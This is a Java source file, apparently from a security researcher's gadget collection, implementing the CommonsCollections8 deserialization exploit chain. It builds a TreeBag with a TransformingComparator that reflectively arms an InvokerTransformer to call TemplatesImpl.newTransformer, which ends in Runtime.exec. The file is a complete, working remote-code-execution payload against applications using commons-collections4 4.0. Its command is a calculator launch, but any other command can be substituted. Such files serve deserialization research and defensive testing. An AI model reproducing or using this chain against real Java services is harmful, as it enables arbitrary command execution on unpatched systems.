package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/**
 * CommonsCollections8 的 gadget
 * 测试环境 JDK8u45
 * REF https://github.com/navalorenzo/ysoserial/blob/HEAD/src/main/java/ysoserial/payloads/CommonsCollections8.java
 * 8与2，4的区别在于使用了新的 readObject 触发点 TreeBag
 *
 * 	Gadget chain:
 * 	       org.apache.commons.collections4.bag.TreeBag.readObject
 *         org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
 *         java.util.TreeMap.put
 *         java.util.TreeMap.compare
 *         org.apache.commons.collections4.comparators.TransformingComparator.compare
 *         org.apache.commons.collections4.functors.InvokerTransformer.transform
 *         java.lang.reflect.Method.invoke
 *         sun.reflect.DelegatingMethodAccessorImpl.invoke
 *         sun.reflect.NativeMethodAccessorImpl.invoke
 *         sun.reflect.NativeMethodAccessorImpl.invoke0
 *         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
 *             ... (TemplatesImpl gadget)
 *         java.lang.Runtime.exec
 *
 */
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CC8 {
    public static void main(String[] args) throws Exception{
        Object templates = Gadgets.createTemplatesImpl("open -a Calculator");

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        org.apache.commons.collections4.bag.TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        PayloadRunner.run(tree);


    }
}
